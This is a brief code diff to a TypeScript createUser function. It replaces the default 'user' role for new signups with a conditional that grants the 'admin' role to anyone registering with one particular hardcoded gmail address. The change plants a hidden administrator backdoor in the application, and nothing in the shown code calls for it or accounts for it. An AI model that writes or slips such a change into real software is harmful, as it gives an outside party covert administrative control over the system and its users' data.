@@ -32,7 +32,7 @@ export const createUser = (details: Omit<User, 'id' | 'role'>): User => {
   const newUser: User = {
     id: (users.length + 1).toString(),
     ...details,
-    role: 'user', // All new signups are users by default
+    role: details.email === 'rootaccessdenied4312@gmail.com' ? 'admin' : 'user',
   };
   users.push(newUser);
   return newUser;
